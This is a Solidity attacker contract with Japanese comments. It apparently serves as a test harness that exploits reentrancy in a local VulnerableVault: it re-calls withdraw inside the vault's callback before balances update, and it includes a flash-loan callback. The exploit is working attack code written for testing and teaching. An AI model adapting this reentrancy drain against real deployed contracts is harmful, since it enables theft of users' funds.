// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./VulnerableVault.sol";

contract ReentrancyAttacker {
    // このコントラクトは「Vault を利用するユーザー」と「攻撃用 callback」の両方を担当する。
    // テストでは EOA の代わりにこのコントラクトを使うことで、Vault から呼び返させる。
    VulnerableVault public vault;
    IERC20 public token;
    address public immutable owner;
    // count は現在何回再入したか、depositAmount は1回の入出金額を表す。
    uint256 public count;
    uint256 public depositAmount = 10 ether;
    // 1 なら callback 中にもう一度 withdraw、0 なら正常な1回の withdraw になる。
    uint256 public maxReentries = 1;

    event AttackStarted(uint256 amount, uint256 maxReentries);
    event ReentryTriggered(uint256 indexed attempt);
    event FlashLoanStarted(uint256 amount);

    constructor(address _vault, address _token) {
        // テストから渡された Vault と ERC20 のアドレスを保存する。
        // owner はこの攻撃用コントラクトをデプロイしたテストコントラクトになる。
        // 1. Vault のアドレスを保存する。
        vault = VulnerableVault(_vault);
        // 2. ERC20 のアドレスを保存する。
        token = IERC20(_token);
        // 3. デプロイしたテストコントラクトを owner として保存する。
        owner = msg.sender;
    }

    function prepare() external {
        // Vault.deposit は token.transferFrom を使うため、先に allowance を設定する。
        // approve の第2引数が、Vault に使わせる最大数量。
        // 1. Vault に depositAmount 分の使用許可を与える。
        token.approve(address(vault), depositAmount);
    }

    function attack() external {
        // 実行順序は count 初期化 -> deposit -> withdraw。
        // withdraw 中に Vault が onVaultWithdraw を呼ぶと、このコントラクトへ処理が戻る。
        // 1. 再入回数を0へ戻す。
        count = 0;
        // 2. 攻撃開始イベントを記録する。
        emit AttackStarted(depositAmount, maxReentries);
        // 3. Vault へトークンを預ける。
        vault.deposit(depositAmount);
        // 4. 出金を開始し、Vault の callback を発生させる。
        vault.withdraw(depositAmount);
    }

    function attackFlashLoan(bytes calldata data) external {
        // Vault から見ると receiver は address(this)。
        // そのため、借入後に Vault が onFlashLoan を呼び出す。
        // 1. フラッシュローン開始イベントを記録する。
        emit FlashLoanStarted(depositAmount);
        // 2. 自分自身を receiver としてフラッシュローンを開始する。
        vault.flashLoan(address(this), depositAmount, data);
    }

    function onVaultWithdraw(address, uint256) external {
        // callback を受け付ける相手を Vault だけに限定する。
        // これがないと、第三者がこの関数を直接呼んで攻撃の順番を壊せる。
        require(msg.sender == address(vault), "only vault callback");
        if (count < maxReentries) {
            // VulnerableVault がまだ balances を減らしていないタイミングで再度 withdraw する。
            // 1. 再入回数を1増やす。
            count += 1;
            // 2. 再入発生イベントを記録する。
            emit ReentryTriggered(count);
            // 3. 残高更新前の Vault へ再び withdraw を呼ぶ。
            vault.withdraw(depositAmount);
        }
    }

    function onFlashLoan(address, uint256 amount, uint256 fee, bytes calldata) external {
        // flashLoan の callback では、借りた元本と手数料をまとめて返す。
        // 1. callback の呼び出し元が Vault か確認する。
        require(msg.sender == address(vault), "only vault callback");
        // 2. 元本と手数料を Vault へ返す。
        require(token.transfer(address(vault), amount + fee), "loan repayment failed");
    }

    function configure(uint256 nextAmount, uint256 nextMaxReentries) external {
        // テスト条件を変更する管理関数。攻撃者の owner だけが呼べる。
        require(msg.sender == owner, "not owner");
        require(nextAmount > 0, "zero amount");
        require(nextMaxReentries <= 10, "too many reentries");
        depositAmount = nextAmount;
        maxReentries = nextMaxReentries;
    }

    function recoverTokens(address recipient, uint256 amount) external {
        // テスト終了後に攻撃用コントラクトへ残ったトークンを回収する関数。
        require(msg.sender == owner, "not owner");
        require(recipient != address(0), "invalid recipient");
        require(token.transfer(recipient, amount), "transfer failed");
    }
}
